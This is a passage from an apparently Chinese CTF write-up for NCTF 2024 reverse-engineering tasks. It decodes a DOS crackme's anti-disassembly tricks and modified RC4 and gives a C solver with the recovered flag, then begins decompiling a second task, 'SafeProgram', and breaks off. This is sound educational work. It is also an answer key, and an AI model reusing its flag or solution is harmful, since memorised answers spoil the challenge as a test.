class="number">0000</span>                 public start</span><br><span class="line">seg002:<span class="number">0000</span> start:</span><br><span class="line">seg002:<span class="number">0000</span>                 mov     ax, seg dseg</span><br><span class="line">seg002:<span class="number">0003</span>                 mov     ds, ax</span><br><span class="line">seg002:<span class="number">0005</span>                 assume ds:dseg</span><br><span class="line">seg002:<span class="number">0005</span>                 mov     es, ax</span><br><span class="line">seg002:<span class="number">0007</span>                 assume es:dseg</span><br><span class="line">seg002:<span class="number">0007</span>                 xor     ax, ax</span><br><span class="line">seg002:<span class="number">0009</span>                 test    ax, ax</span><br><span class="line">seg002:<span class="number">000B</span>                 jnz     <span class="type">short</span> loc_104BF</span><br><span class="line">seg002:<span class="number">000</span>D                 jz      <span class="type">short</span> loc_104C0</span><br><span class="line">seg002:<span class="number">000F</span></span><br><span class="line">seg002:<span class="number">000F</span> loc_104BF:                              ; CODE XREF: seg002:<span class="number">000B</span>↑j</span><br><span class="line">seg002:<span class="number">000F</span>                 nop</span><br><span class="line">seg002:<span class="number">0010</span></span><br><span class="line">seg002:<span class="number">0010</span> loc_104C0:                              ; CODE XREF: seg002:<span class="number">000</span>D↑j</span><br><span class="line">seg002:<span class="number">0010</span>                 mov     ah, <span class="number">9</span></span><br><span class="line">seg002:<span class="number">0012</span>                 lea     dx, aShowMeYourFlag ; <span class="string">&quot;\r\nShow me your flag: $\r\nCongradulat&quot;</span>...</span><br><span class="line">seg002:<span class="number">0016</span>                 <span class="type">int</span>     <span class="number">21</span>h             ; DOS - PRINT STRING</span><br><span class="line">seg002:<span class="number">0016</span>                                         ; DS:DX -&gt; <span class="built_in">string</span> terminated by <span class="string">&quot;$&quot;</span></span><br><span class="line">seg002:<span class="number">0018</span>                 mov     ah, <span class="number">0</span>Ah</span><br><span class="line">seg002:<span class="number">001</span>A                 lea     dx, unk_10168</span><br><span class="line">seg002:<span class="number">001</span>E                 <span class="type">int</span>     <span class="number">21</span>h             ; DOS - BUFFERED KEYBOARD INPUT</span><br><span class="line">seg002:<span class="number">001</span>E                                         ; DS:DX -&gt; buffer</span><br><span class="line">seg002:<span class="number">0020</span>                 call    sub_10630</span><br><span class="line">seg002:<span class="number">0025</span>                 lea     bx, unk_10168</span><br><span class="line">seg002:<span class="number">0029</span>                 inc     bx</span><br><span class="line">seg002:<span class="number">002</span>A                 cmp     byte ptr [bx], <span class="number">26</span>h ; <span class="string">&#x27;&amp;&#x27;</span></span><br><span class="line">seg002:<span class="number">002</span>D                 jz      <span class="type">short</span> loc_104E2</span><br><span class="line">seg002:<span class="number">002F</span>                 jmp     loc_105B7</span><br></pre></td></tr></table></figure><p>这部分是将输入放在168的位置，并且168里放的是大小，要比对大小是0x26</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">seg002:<span class="number">0032</span> ; ---------------------------------------------------------------------------</span><br><span class="line">seg002:<span class="number">0032</span></span><br><span class="line">seg002:<span class="number">0032</span> loc_104E2:                              ; CODE XREF: seg002:<span class="number">002</span>D↑j</span><br><span class="line">seg002:<span class="number">0032</span>                 xor     si, si</span><br><span class="line">seg002:<span class="number">0034</span>                 xor     di, di</span><br><span class="line">seg002:<span class="number">0036</span>                 xor     cx, cx</span><br><span class="line">seg002:<span class="number">0038</span>                 mov     cx, <span class="number">100</span>h</span><br><span class="line">seg002:<span class="number">003B</span></span><br><span class="line">seg002:<span class="number">003B</span> loc_104EB:                              ; CODE XREF: seg002:<span class="number">003</span>D↓j</span><br><span class="line">seg002:<span class="number">003B</span>                 push    di</span><br><span class="line">seg002:<span class="number">003</span>C                 inc     di</span><br><span class="line">seg002:<span class="number">003</span>D                 loop    loc_104EB</span><br><span class="line">seg002:<span class="number">003F</span></span><br><span class="line">seg002:<span class="number">003F</span> loc_104EF:                              ; CODE XREF: seg002:<span class="number">0052</span>↓j</span><br><span class="line">seg002:<span class="number">003F</span>                 pop     bx</span><br><span class="line">seg002:<span class="number">0040</span>                 call    sub_10670</span><br><span class="line">seg002:<span class="number">0045</span>                 mov     bx, si</span><br><span class="line">seg002:<span class="number">0047</span>                 mov     [si+<span class="number">0</span>], bl</span><br><span class="line">seg002:<span class="number">004B</span>                 inc     si</span><br><span class="line">seg002:<span class="number">004</span>C                 cmp     si, <span class="number">100</span>h</span><br><span class="line">seg002:<span class="number">0050</span>                 jnb     <span class="type">short</span> loc_10504</span><br><span class="line">seg002:<span class="number">0052</span>                 jmp     <span class="type">short</span> loc_104EF</span><br></pre></td></tr></table></figure><p>本题第一个坑，rc4的init阶段，刚开始有一个push 0x100次压栈，但乍一看后面好像并没有用到但是我们去关注sub_10670函数本身</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">seg005:<span class="number">0000</span> sub_10670       proc far                ; CODE XREF: seg002:<span class="number">0040</span>↑P</span><br><span class="line">seg005:<span class="number">0000</span>                 pop     dx</span><br><span class="line">seg005:<span class="number">0001</span>                 push    ax</span><br><span class="line">seg005:<span class="number">0002</span>                 xor     ax, ax</span><br><span class="line">seg005:<span class="number">0004</span>                 mov     ax, <span class="number">0F</span>h</span><br><span class="line">seg005:<span class="number">0007</span>                 and     ax, <span class="number">7</span></span><br><span class="line">seg005:<span class="number">000</span>A                 shl     ax, <span class="number">1</span></span><br><span class="line">seg005:<span class="number">000</span>C                 shl     ax, <span class="number">1</span></span><br><span class="line">seg005:<span class="number">000</span>E                 mov     ah, <span class="number">1</span>Ah</span><br><span class="line">seg005:<span class="number">0010</span>                 not     ah</span><br><span class="line">seg005:<span class="number">0012</span>                 shr     ah, <span class="number">1</span></span><br><span class="line">seg005:<span class="number">0014</span>                 shr     ah, <span class="number">1</span></span><br><span class="line">seg005:<span class="number">0016</span>                 xor     al, ah</span><br><span class="line">seg005:<span class="number">0018</span>                 sub     ah, <span class="number">1</span>Eh</span><br><span class="line">seg005:<span class="number">001B</span>                 and     al, ah</span><br><span class="line">seg005:<span class="number">001</span>D                 inc     al</span><br><span class="line">seg005:<span class="number">001F</span>                 add     dl, al</span><br><span class="line">seg005:<span class="number">0021</span>                 pop     ax</span><br><span class="line">seg005:<span class="number">0022</span>                 push    dx</span><br><span class="line">seg005:<span class="number">0023</span>                 retf</span><br><span class="line">seg005:<span class="number">0023</span> sub_10670       endp</span><br></pre></td></tr></table></figure><p>ret&#x3D;pop jmp，所以最后push进去的就会是跳转，刚开始pop dx，返回地址被取出，add dl,al，这里对返回地址改动，这个数字是固定的，经过计算这里的al是2，所以call    sub_10670后紧跟的两字节是被越过的</p><p>所以再次观察就会发现，bl里的值就是先前压栈的值，并且栈是先进后出，所以这里rc4init是反着来的盒，所以第一部分造盒</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">rc4init1</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> a = <span class="number">0xff</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">box[i] = a;</span><br><span class="line">a--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">0x10</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, box[j + i * <span class="number">0x10</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>紧接着往后看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">seg002:<span class="number">0054</span> loc_10504:                              ; CODE XREF: seg002:<span class="number">0050</span>↑j</span><br><span class="line">seg002:<span class="number">0054</span>                 xor     si, si</span><br><span class="line">seg002:<span class="number">0056</span>                 xor     di, di</span><br><span class="line">seg002:<span class="number">0058</span>                 mov     bx, <span class="number">134</span>h</span><br><span class="line">seg002:<span class="number">005B</span>                 mov     cl, [bx]</span><br><span class="line">seg002:<span class="number">005</span>D</span><br><span class="line">seg002:<span class="number">005</span>D loc_1050D:                              ; CODE XREF: seg002:<span class="number">00B</span>9↓j</span><br><span class="line">seg002:<span class="number">005</span>D                 mov     dl, [si+<span class="number">0</span>]</span><br><span class="line">seg002:<span class="number">0061</span>                 add     di, dx</span><br><span class="line">seg002:<span class="number">0063</span>                 mov     ax, si</span><br><span class="line">seg002:<span class="number">0065</span>                 div     cl</span><br><span class="line">seg002:<span class="number">0067</span>                 mov     al, ah</span><br><span class="line">seg002:<span class="number">0069</span>                 xor     ah, ah</span><br><span class="line">seg002:<span class="number">006B</span>                 mov     bx, <span class="number">135</span>h</span><br><span class="line">seg002:<span class="number">006</span>E                 add     bx, ax</span><br><span class="line">seg002:<span class="number">0070</span>                 mov     al, [bx]</span><br><span class="line">seg002:<span class="number">0072</span>                 push    ax</span><br><span class="line">seg002:<span class="number">0073</span>                 call    jmp_$<span class="number">6</span></span><br><span class="line">seg002:<span class="number">0078</span>                 shl     ax, <span class="number">1</span></span><br><span class="line">seg002:<span class="number">007</span>A                 shl     ax, <span class="number">1</span></span><br><span class="line">seg002:<span class="number">007</span>C                 shl     ax, <span class="number">1</span></span><br><span class="line">seg002:<span class="number">007</span>E                 shl     ax, <span class="number">1</span></span><br><span class="line">seg002:<span class="number">0080</span>                 shl     ax, <span class="number">1</span></span><br><span class="line">seg002:<span class="number">0082</span>                 shl     ax, <span class="number">1</span></span><br><span class="line">seg002:<span class="number">0084</span>                 mov     dx, ax</span><br><span class="line">seg002:<span class="number">0086</span>                 pop     ax</span><br><span class="line">seg002:<span class="number">0087</span>                 push    dx</span><br><span class="line">seg002:<span class="number">0088</span>                 call    jmp_$<span class="number">2</span></span><br><span class="line">seg002:<span class="number">008</span>D                 shr     ax, <span class="number">1</span></span><br><span class="line">seg002:<span class="number">008F</span>                 shr     ax, <span class="number">1</span></span><br><span class="line">seg002:<span class="number">0091</span>                 shr     ax, <span class="number">1</span></span><br><span class="line">seg002:<span class="number">0093</span>                 shr     ax, <span class="number">1</span></span><br><span class="line">seg002:<span class="number">0095</span>                 shr     ax, <span class="number">1</span></span><br><span class="line">seg002:<span class="number">0097</span>                 shr     ax, <span class="number">1</span></span><br><span class="line">seg002:<span class="number">0099</span>                 pop     dx</span><br><span class="line">seg002:<span class="number">009</span>A                 or      al, dl</span><br><span class="line">seg002:<span class="number">009</span>C                 add     di, ax</span><br><span class="line">seg002:<span class="number">009</span>E                 and     di, <span class="number">0F</span>Fh</span><br><span class="line">seg002:<span class="number">00</span>A2                 mov     al, [si+<span class="number">0</span>]</span><br><span class="line">seg002:<span class="number">00</span>A6                 mov     dl, [di+<span class="number">0</span>]</span><br><span class="line">seg002:<span class="number">00</span>AA                 xchg    al, dl</span><br><span class="line">seg002:<span class="number">00</span>AC                 mov     [di+<span class="number">0</span>], dl</span><br><span class="line">seg002:<span class="number">00B</span>0                 mov     [si+<span class="number">0</span>], al</span><br><span class="line">seg002:<span class="number">00B</span>4                 inc     si</span><br><span class="line">seg002:<span class="number">00B</span>5                 cmp     si, <span class="number">100</span>h</span><br><span class="line">seg002:<span class="number">00B</span>9                 jb      <span class="type">short</span> loc_1050D</span><br></pre></td></tr></table></figure><p>于是就该换盒了，si&#x3D;i,di&#x3D;j，慢慢看，134里面存储的是0xc，后面紧跟着是’NCTf2024nctF’，刚好12字节大小，并且0xc给了cl，[+0]代表的是前面造的盒</p><p>一开始是</p><p>dl&#x3D;S[i];</p><p>j&#x3D;j+dl;</p><p>al&#x3D;key[i%0xc];</p><p>后面紧跟着的push ax是为了把前面左移和后面右移区分，同时这两个函数也和前面一样是用来改变返回地址的，所以这里实现的是：</p><p>push ax;</p><p>shl ax,3;</p><p>mov dx,ax;</p><p>pop ax;</p><p>push dx;</p><p>shr ax,5;</p><p>pop dx;</p><p>or al,dl:</p><p>add di,ax;</p><p>也就相当于(a&lt;&lt;3)|(a&gt;&gt;5)，最后j+&#x3D;a;</p><p>j%256;</p><p>change(S[i],S[j]);</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">seg002:<span class="number">00B</span>B                 xor     cx, cx</span><br><span class="line">seg002:<span class="number">00B</span>D                 mov     bx, <span class="number">169</span>h</span><br><span class="line">seg002:<span class="number">00</span>C0                 mov     cl, [bx]</span><br><span class="line">seg002:<span class="number">00</span>C2                 inc     bx</span><br><span class="line">seg002:<span class="number">00</span>C3                 mov     si, bx</span><br><span class="line">seg002:<span class="number">00</span>C5                 xor     bx, bx</span><br><span class="line">seg002:<span class="number">00</span>C7                 xor     dx, dx</span><br><span class="line">seg002:<span class="number">00</span>C9                 xor     ax, ax</span><br><span class="line">seg002:<span class="number">00</span>CB                 test    ax, ax</span><br><span class="line">seg002:<span class="number">00</span>CD                 jnz     <span class="type">short</span> loc_10581</span><br><span class="line">seg002:<span class="number">00</span>CF                 jz      <span class="type">short</span> loc_10582</span><br><span class="line">seg002:<span class="number">00</span>D1</span><br><span class="line">seg002:<span class="number">00</span>D1 loc_10581:                              ; CODE XREF: seg002:<span class="number">00</span>CD↑j</span><br><span class="line">seg002:<span class="number">00</span>D1                 nop</span><br><span class="line">seg002:<span class="number">00</span>D2</span><br><span class="line">seg002:<span class="number">00</span>D2 loc_10582:                              ; CODE XREF: seg002:<span class="number">00</span>CF↑j</span><br><span class="line">seg002:<span class="number">00</span>D2                                         ; seg002:<span class="number">00F</span>E↓j</span><br><span class="line">seg002:<span class="number">00</span>D2                 inc     bl</span><br><span class="line">seg002:<span class="number">00</span>D4                 mov     al, [bx+<span class="number">0</span>]</span><br><span class="line">seg002:<span class="number">00</span>D8                 add     dl, al</span><br><span class="line">seg002:<span class="number">00</span>DA                 push    dx</span><br><span class="line">seg002:<span class="number">00</span>DB                 mov     di, dx</span><br><span class="line">seg002:<span class="number">00</span>DD                 mov     al, [bx+<span class="number">0</span>]</span><br><span class="line">seg002:<span class="number">00E1</span>                 xchg    al, [di+<span class="number">0</span>]</span><br><span class="line">seg002:<span class="number">00E5</span>                 mov     [bx+<span class="number">0</span>], al</span><br><span class="line">seg002:<span class="number">00E9</span>                 add     al, [di+<span class="number">0</span>]</span><br><span class="line">seg002:<span class="number">00</span>ED                 mov     di, ax</span><br><span class="line">seg002:<span class="number">00</span>EF                 mov     al, [di+<span class="number">0</span>]</span><br><span class="line">seg002:<span class="number">00F</span>3                 call    jmp_$<span class="number">1</span></span><br><span class="line">seg002:<span class="number">00F</span>8                 inc     ax</span><br><span class="line">seg002:<span class="number">00F</span>9                 inc     ax</span><br><span class="line">seg002:<span class="number">00F</span>A                 xor     [si], al</span><br><span class="line">seg002:<span class="number">00F</span>C                 pop     dx</span><br><span class="line">seg002:<span class="number">00F</span>D                 inc     si</span><br><span class="line">seg002:<span class="number">00F</span>E                 loop    loc_10582</span><br><span class="line">seg002:<span class="number">0100</span>                 jmp     <span class="type">short</span> loc_105C1</span><br></pre></td></tr></table></figure><p>最后一段，怎么说呢，复杂归复杂，慢慢捋出来把，其实就是rc4稍微变了一下。。。服了卡了一天</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> box[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">rc4init1</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> a = <span class="number">0xff</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">box[i] = a;</span><br><span class="line">a--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">0x10</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, box[j + i * <span class="number">0x10</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">rc4init2</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* key)</span> &#123;</span><br><span class="line"><span class="type">int</span> i, j;</span><br><span class="line">i = <span class="number">0</span>;</span><br><span class="line">j = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> high;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> low;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> mi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">j = box[i] + j;</span><br><span class="line">high = key[i % <span class="number">0xc</span>];</span><br><span class="line">low = high;</span><br><span class="line">mi = ((high &lt;&lt; <span class="number">3</span>) &amp; <span class="number">0xff</span>) | ((low &gt;&gt; <span class="number">5</span>) &amp; <span class="number">0xff</span>);</span><br><span class="line">j = (j + mi) % <span class="number">256</span>;</span><br><span class="line">mi = box[i];</span><br><span class="line">box[i] = box[j];</span><br><span class="line">box[j] = mi;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">0x10</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, box[j + i * <span class="number">0x10</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">rc4</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* flag)</span> &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> mi;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> t;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> q = <span class="number">0</span>; q &lt; <span class="built_in">strlen</span>(flag); q++)</span><br><span class="line">&#123;</span><br><span class="line">i++;</span><br><span class="line">j = (j + box[i]) % <span class="number">256</span>;</span><br><span class="line"></span><br><span class="line">mi = box[j];</span><br><span class="line">box[j] = box[i];</span><br><span class="line">box[i] = mi;</span><br><span class="line"></span><br><span class="line">t = (box[i] + box[j]) % <span class="number">256</span>;</span><br><span class="line">t = box[t];</span><br><span class="line">t++;</span><br><span class="line"></span><br><span class="line">flag[q] ^= t;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, flag[q]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> key[] = <span class="string">&quot;NCTf2024nctF&quot;</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> flag[] = &#123;</span><br><span class="line"><span class="number">0x7C</span>, <span class="number">0x3E</span>, <span class="number">0x0D</span>, <span class="number">0x3C</span>, <span class="number">0x88</span>, <span class="number">0x54</span>, <span class="number">0x83</span>, <span class="number">0x0E</span>, <span class="number">0x3B</span>, <span class="number">0xB8</span>, <span class="number">0x99</span>, <span class="number">0x1B</span>, <span class="number">0x9B</span>, <span class="number">0xE5</span>, <span class="number">0x23</span>, <span class="number">0x43</span>,</span><br><span class="line"><span class="number">0xC5</span>, <span class="number">0x80</span>, <span class="number">0x45</span>, <span class="number">0x5B</span>, <span class="number">0x9A</span>, <span class="number">0x29</span>, <span class="number">0x24</span>, <span class="number">0x38</span>, <span class="number">0xA9</span>, <span class="number">0x5C</span>, <span class="number">0xCB</span>, <span class="number">0x7A</span>, <span class="number">0xE5</span>, <span class="number">0x93</span>, <span class="number">0x73</span>, <span class="number">0x0E</span>,</span><br><span class="line"><span class="number">0x70</span>, <span class="number">0x6D</span>, <span class="number">0x7C</span>, <span class="number">0x31</span>, <span class="number">0x2B</span>, <span class="number">0x8C</span>, <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line">rc4init1();</span><br><span class="line">rc4init2(key);</span><br><span class="line">rc4(flag);</span><br><span class="line"><span class="comment">//NCTF&#123;Y0u_4r3_Assemb1y_M4st3r_5d0b497e&#125;</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="SafeProgram"><a href="#SafeProgram" class="headerlink" title="SafeProgram"></a>SafeProgram</h2><p>拖进去</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE v4[<span class="number">24</span>]; <span class="comment">// [rsp+38h] [rbp-70h] BYREF</span></span><br><span class="line">  _BYTE Buf1[<span class="number">16</span>]; <span class="comment">// [rsp+50h] [rbp-58h] BYREF</span></span><br><span class="line">  _BYTE Buf1_1[<span class="number">48</span>]; <span class="comment">// [rsp+60h] [rbp-48h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_7FF6E42D15F0(argc, argv, envp);</span><br><span class="line">  <span class="built_in">memset</span>(Str1, <span class="number">0</span>, <span class="keyword">sizeof</span>(Str1));</span><br><span class="line">  <span class="built_in">memset</span>(byte_7FF6E42FC380, <span class="number">0</span>, <span class="keyword">sizeof</span>(byte_7FF6E42FC380));</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="number">0x14u</span>LL);</span><br><span class="line">  sub_7FF6E42D1830(aWelcomeToNctf);             <span class="comment">// &quot;Welcome to NCTF\n&quot;</span></span><br><span class="line">  Sleep(<span class="number">0x1F4u</span>);</span><br><span class="line">  sub_7FF6E42D1830(aEnterYourFlag);             <span class="comment">// &quot;Enter your flag &quot;</span></span><br><span class="line">  Sleep(<span class="number">0x1F4u</span>);</span><br><span class="line">  sub_7FF6E42D1830(aAndHaveAGoodTi);            <span class="comment">// &quot;And have a good time: &quot;</span></span><br><span class="line">  sub_7FF6E42D18B0(<span class="string">&quot;%64s&quot;</span>, Str1);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(Str1) != <span class="number">38</span> )</span><br><span class="line">  